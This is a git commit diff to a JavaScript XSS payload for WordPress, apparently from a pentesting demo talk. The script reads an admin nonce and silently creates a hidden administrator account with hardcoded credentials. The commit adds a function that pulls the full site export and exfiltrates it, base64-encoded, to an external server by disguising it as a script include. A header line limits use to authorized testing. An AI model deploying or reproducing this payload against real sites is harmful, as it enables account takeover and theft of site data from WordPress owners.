eafcd377dc732bd20e21b144174d58e8d5360cc9
hoodoer <drew.kirkpatrick@gmail.com>
2019-11-02 21:00:18 +1100

    Added ability to exfil the whole wordpress site content backup to and external server

--- wpXssAdminFuncs.js
+++ wpXssAdminFuncs.js
@@ -4,6 +4,8 @@
 
 	Built for an XSS to shell demo/talk. 
 
+	Inject a script include for this file. 
+
 	Only use this code for pentesting systems you're authorized to 
 	touch. Or I will be seriously grumpy in your general direction. 
 
@@ -12,6 +14,15 @@
 
 	https://github.com/hoodoer
 */
+
+
+
+
+// Web server listening for exfil data
+// This will be as base64 data with a .js added, trying to 
+// include a non-exist remote javascript file so you 
+// get the base64 data in the 404 log
+var httpExfilServer = "http://192.168.78.135:8888"
 
 
 function read_body(xhr) { 
@@ -43,19 +54,16 @@ function read_body(xhr) {
 function sendAddUserPost(nonce)
 {
 	// The following user will be added as an Administrator level user
-	var uri       = "/wp-admin/user-new.php";
 	var username  = "ishouldntbehere";
 	var email     = "advancedadmin%40bad.af"
 	var firstName = "trevor";
 	var lastName  = "roach";
 	var password  = "toor";
 
-//	console.log("Starting addUser...");
-//	console.log("In addUser, nonce value is: " + nonce);
+	var uri       = "/wp-admin/user-new.php";
 
 	xhr = new XMLHttpRequest();
 	xhr.open("POST", uri);
-	// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 
  	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -79,8 +87,6 @@ function sendAddUserPost(nonce)
 	body += "createuser=Add+New+User";
 
 	xhr.send(body);
-
-	//console.log("Done adding new user: " + username);
 }
 
 
@@ -88,8 +94,6 @@ function sendAddUserPost(nonce)
 function getNonceAndAddUser()
 {
 	// console.log("Starting getNonce...");
-
-
 	var uri = "/wp-admin/user-new.php";
 
 	xhr = new XMLHttpRequest();
@@ -107,19 +111,47 @@ function getNonceAndAddUser()
 		//	console.log("Nonce position: " + noncePos);
 
 			var nonceVal = response.substring(noncePos+35, noncePos+45);
-
-		//	console.log("Inner Nonce value: " + nonceVal);
-
 			sendAddUserPost(nonceVal);
 		}
 	}
+}
 
+
+
+// Exports the content of the wordpress site, incase you want to clone it
+// Exfils the base64 encoded content as as script include, e.g. [base64 data].js
+// because we can't just GET parameter it out due to CORS in wordpress
+function exportWordPressSite()
+{
+	var uri = "/wp-admin/export.php?download=true&content=all&cat=0&post_author=0&post_start_date=0&post_end_date=0&post_status=0&page_author=0&page_start_date=0&page_end_date=0&page_status=0&attachment_start_date=0&attachment_end_date=0&submit=Download+Export+File";
+	
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+	xhr.onreadystatechange = function()
+	{
+		if (xhr.readyState == XMLHttpRequest.DONE)
+		{
+			var response = read_body(xhr);
+
+			// This will fail since the script doesn't exist, but you'll
+			// get the base64 data on the 404 log on the server. 
+			// You can't just do an XHR request
+			// off to the external server due to the CORS policy
+			var script = document.createElement("script");
+			script.src = httpExfilServer + "/script/" + btoa(response) + ".js";
+
+    		document.head.appendChild(script);  // add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
+		}
+	}
 }
 
 
 
 
-
-// This needs cleanup
-getNonceAndAddUser();
+// Uncomment the function you want to run on the XSS pop
+//getNonceAndAddUser();
+//exportWordPressSite();
 
